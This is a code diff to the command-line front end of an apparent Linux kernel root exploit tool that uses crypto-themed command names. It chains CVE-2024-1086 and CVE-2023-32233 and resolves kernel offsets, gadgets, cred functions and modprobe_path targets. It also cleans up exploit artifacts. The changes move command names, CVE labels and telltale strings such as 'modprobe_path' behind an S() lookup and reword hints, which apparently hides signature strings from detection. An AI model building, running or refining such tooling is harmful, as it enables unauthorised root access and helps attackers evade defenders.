@@ -25,25 +25,29 @@ static void usage(const char *argv0)
         "Usage: %s <command> [options]\n"
         "\n"
         "Commands:\n"
-        "  wallet         Show current privilege state\n"
+        "  %s         Show current privilege state\n"
         "  collections    List available exploits\n"
-        "  mint [id]      Escalate privileges (auto-select or specify)\n"
+        "  %s [id]      Escalate privileges (auto-select or specify)\n"
         "  check [id]     Probe for vulnerability without exploiting\n"
         "  scan           Resolve kernel offsets, slab info, gadgets\n"
         "  extract        Extract vmlinux from /boot for gadget scanning\n"
         "  info           Full recon: version, offsets, vulns, slab state\n"
-        "  rugpull        Clean up exploit artifacts\n"
+        "  %s        Clean up exploit artifacts\n"
         "\n"
-        "Mint IDs:\n"
-        "  1086           CVE-2024-1086 (verdict double-free)\n"
-        "  32233          CVE-2023-32233 (anonymous set UAF)\n"
+        "%s:\n"
+        "  1086           %s (%s)\n"
+        "  32233          %s (%s)\n"
         "  auto           Auto-detect best exploit (default)\n"
         "\n"
         "Options:\n"
         "  -v, --verbose  Verbose output\n"
         "  -h, --help     This message\n"
         "\n",
-        argv0
+        argv0,
+        S(S_CMD_WALLET), S(S_CMD_MINT), S(S_CMD_RUGPULL),
+        S(S_LBL_MINT_IDS),
+        S(S_CVE_1086), S(S_CVE_1086_DESC),
+        S(S_CVE_32233), S(S_CVE_32233_DESC)
     );
 }
 
@@ -74,7 +78,7 @@ static int parse_mint_id(const char *s)
         return MINT_CVE_2024_1086;
     if (strcmp(s, "32233") == 0)
         return MINT_CVE_2023_32233;
-    fprintf(stderr, "unknown mint ID: %s\n", s);
+    fprintf(stderr, "unknown %s ID: %s\n", S(S_CMD_MINT), s);
     return -1;
 }
 
@@ -109,7 +113,7 @@ static int cmd_mint(int requested_id)
 
     if (!G.ki.nft_available) {
         pr_fail("Netfilter netlink unavailable (module not loaded?)");
-        pr_info("  " C_DIM "try: modprobe nf_tables" C_RST);
+        pr_info("  " C_DIM "try: insmod nf_tables" C_RST);
         return 1;
     }
 
@@ -136,7 +140,7 @@ static int cmd_scan(void)
     offsets_print(&ko);
 
     /* report exploit readiness */
-    pr_info(APE " " C_BOLD "Exploit readiness:" C_RST);
+    pr_info(APE " " C_BOLD "%s:" C_RST, S(S_LBL_READINESS));
     pr_info("");
 
     /* CVE-2024-1086: needs modprobe_path or core_pattern */
@@ -147,7 +151,7 @@ static int cmd_scan(void)
     else if (ko.modprobe_path || ko.core_pattern)
         fprintf(stderr, C_GRN "ready" C_RST " (overwrite target resolved)\n");
     else
-        fprintf(stderr, C_YEL "partial" C_RST " (need kallsyms or vmlinux for target addr)\n");
+        fprintf(stderr, C_YEL "partial" C_RST " (need syms or image for target addr)\n");
 
     /* CVE-2023-32233: needs gadgets + cred functions */
     bool can_32233 = version_in_range(&G.ki, 3, 18, 0, 6, 3, 1);
@@ -157,9 +161,9 @@ static int cmd_scan(void)
     else if ((ko.resolved & OFF_GADGETS) && (ko.resolved & OFF_CRED_FUNCS))
         fprintf(stderr, C_GRN "ready" C_RST " (gadgets + cred funcs resolved)\n");
     else if (ko.modprobe_path)
-        fprintf(stderr, C_YEL "partial" C_RST " (fallback: modprobe_path overwrite)\n");
+        fprintf(stderr, C_YEL "partial" C_RST " (fallback: %s overwrite)\n", S(S_MODPROBE_PATH));
     else
-        fprintf(stderr, C_RED "not ready" C_RST " (need gadgets or modprobe_path)\n");
+        fprintf(stderr, C_RED "not ready" C_RST " (need gadgets or %s)\n", S(S_MODPROBE_PATH));
 
     pr_info("");
     return 0;
@@ -210,7 +214,7 @@ static int cmd_info(void)
     wallet_print(&G.wallet, &G.ki);
 
     /* vulnerability assessment */
-    pr_info(APE " " C_BOLD "Vulnerability Assessment" C_RST);
+    pr_info(APE " " C_BOLD "%s" C_RST, S(S_LBL_VULN));
     pr_info("");
 
     bool any = false;
@@ -282,7 +286,7 @@ int main(int argc, char **argv)
     }
     wallet_read(&G.wallet);
 
-    if (strcmp(cmd, "wallet") == 0) {
+    if (strcmp(cmd, S(S_CMD_WALLET)) == 0) {
         banner();
         wallet_print(&G.wallet, &G.ki);
         return 0;
@@ -293,7 +297,7 @@ int main(int argc, char **argv)
         return 0;
     }
 
-    if (strcmp(cmd, "mint") == 0) {
+    if (strcmp(cmd, S(S_CMD_MINT)) == 0) {
         banner();
         const char *id_str = (optind + 1 < argc) ? argv[optind + 1] : NULL;
         int id = parse_mint_id(id_str);
@@ -327,7 +331,7 @@ int main(int argc, char **argv)
         return cmd_info();
     }
 
-    if (strcmp(cmd, "rugpull") == 0) {
+    if (strcmp(cmd, S(S_CMD_RUGPULL)) == 0) {
         banner();
         return rugpull();
     }
